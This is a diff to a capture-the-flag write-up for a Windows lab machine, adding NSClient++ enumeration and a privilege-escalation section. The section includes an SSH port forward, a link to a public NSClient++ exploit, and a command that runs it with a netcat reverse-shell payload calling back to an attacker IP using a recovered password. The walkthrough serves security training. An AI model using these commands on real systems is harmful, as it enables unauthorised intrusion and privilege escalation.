@@ -6,7 +6,7 @@
 
 - Difficulty: Easy
 - Platform: Windows
-- Skills Demonstrated: FTP Enumeration, Web Application Vulnerabilities, Windows Privilege Escalation
+- Skills Demonstrated: FTP Enumeration, Web Application Enumeration, Local File Inclusion (LFI), SSH Authentication Attacks, Windows Privilege Escalation
 
 ## Methodology 
 
@@ -113,7 +113,13 @@ In this case, the FTP service exposed the `Home` directory revealing the users `
 
 The contents of this file revealed the existence of a `passwords.txt` file located on `Nathan`'s desktop.
 
-Although the FTP service revealed useful information, no immediate access was obtained. Enumeration therefore continued with the web service on port 80.
+Although the FTP service revealed useful information, no immediate access was obtained. Further enumeration identified an HTTPS service running on port 8443. Accessing the service revealed an **NSClient++** web interface. No immediate exploitation path was identified at this stage, so enumeration continued with the HTTP service running on port 80.
+
+Port 8443
+
+![nsclient](Images/nclient.png)
+
+Port 80
 
 ![website](Images/website.png)
 
@@ -143,4 +149,32 @@ ssh nadine@10.129.227.77
 ![ssh](Images/ssh.png)
 
 # Privilege Escalation
+
+During privilege escalation enumeration, the previously identified NSClient++ service was revisited. Further investigation of the installed applications revealed **NSClient++** was installed in the `Program Files` directory, indicating that the service could potentially be leveraged for privilege escalation.
+
+Examinging the configuration file revealed the web interface authentication password and the allowed hosts, which in this case is restricted to the local machine(`127.0.0.1`) 
+
+![config](/Images/config.png)
+
+The installed version was identified and since the **NSClient++** interface was only accessible locally, an SSH local port forward was configured
+```
+nscp.exe --version
+```
+
+![version](Images/version.png)
+
+```
+ssh -L 8443:127.0.0.1:8443 nadine@10.129.227.77
+```
+
+A search for a publicly available exploit matching the identified version revealed a suitable exploit. The exploit was transferred to the target machine along with a Netcat binary to establish a reverse shell.
+
+Exploit source: https://github.com/xtizi/NSClient-0.5.2.35---Privilege-Escalation
+
+The exploit was executed, causing NSClient++ to execute the payload with elevated privileges and providing a reverse shell back to the Kali machine.
+```
+privesc.py "C:\Users\Nadine\Desktop\nc.exe 10.10.16.2 443 -e cmd.exe" https://127.0.0.1:8443 ew2x6SsGTxjRwXOT
+```
+
+![system](Images/system.png)
 
